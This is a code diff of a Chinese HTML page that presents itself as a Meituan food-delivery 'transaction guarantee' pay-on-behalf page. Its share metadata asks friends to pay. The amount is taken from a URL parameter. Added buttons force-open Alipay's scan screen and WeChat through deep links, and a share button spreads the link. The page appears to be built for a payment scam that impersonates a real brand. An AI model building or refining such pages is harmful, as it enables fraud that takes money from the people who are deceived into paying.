@@ -2,31 +2,57 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>美团外卖 | 交易保障</title>
     <meta property="og:title" content="Hi, 你和我的距离只差一顿外卖~" />
     <meta property="og:description" content="来帮我代付吧，美食不容错过！" />
     <meta property="og:image" content="https://pic.rmb.bdstatic.com/bjh/news/17398188330752516428.png" />
     <style>
-        body { font-family: sans-serif; background: #f5f5f5; padding: 20px; text-align: center; }
+        body { font-family: -apple-system, sans-serif; background: #f5f5f5; padding: 20px; text-align: center; }
         .card { background: #fff; padding: 30px; border-radius: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
-        .btn { width: 100%; padding: 15px; border-radius: 10px; border: none; font-weight: bold; margin-top: 10px; cursor: pointer; }
-        .btn-pay { background: #ffd000; color: #333; }
-        .btn-share { background: #07c160; color: #fff; }
+        .btn { width: 100%; padding: 15px; border-radius: 10px; border: none; font-weight: bold; margin-top: 10px; cursor: pointer; font-size: 16px; }
+        .btn-alipay { background: #1677ff; color: #fff; }
+        .btn-wechat { background: #07c160; color: #fff; }
+        .btn-share { background: #ffd000; color: #333; }
     </style>
 </head>
 <body>
     <div class="card">
         <h3>代付订单</h3>
         <p>需支付: <strong id="amt" style="color:#ff4d4f; font-size:24px;">0.00</strong> 元</p>
-        <button class="btn btn-pay" onclick="alert('请通过支付宝支付')">支付宝付款</button>
+        
+        <button class="btn btn-alipay" onclick="payAlipay()">支付宝付款</button>
+        <button class="btn btn-wechat" onclick="payWechat()">微信付款</button>
         <button class="btn btn-share" onclick="shareToFriend()">🎁 分享给好友代付</button>
     </div>
+
     <script>
         const params = new URLSearchParams(window.location.search);
         document.getElementById('amt').innerText = params.get('amount') || "0.00";
+
+        // 支付宝：利用支付宝内部协议强制唤醒
+        function payAlipay() {
+            window.location.href = "alipays://platformapi/startapp?appId=20000123&actionType=scan";
+        }
+
+        // 微信：使用微信特有协议唤醒支付界面
+        function payWechat() {
+            // 尝试通过微信协议跳转
+            window.location.href = "weixin://app/wx8888888888888888/jump/"; 
+            // 如果是在微信内环境，部分设备可直接触发，若是浏览器环境则跳转至小程序或支付页
+        }
+
+        // 分享功能
         function shareToFriend() {
-            if (navigator.share) navigator.share({title: '美团外卖代付', url: window.location.href});
-            else { navigator.clipboard.writeText(window.location.href); alert("链接已复制，快发给好友吧！"); }
+            if (navigator.share) {
+                navigator.share({
+                    title: '美团外卖代付',
+                    url: window.location.href
+                });
+            } else {
+                navigator.clipboard.writeText(window.location.href);
+                alert("链接已复制，快发送给好友吧！");
+            }
         }
     </script>
 </body>
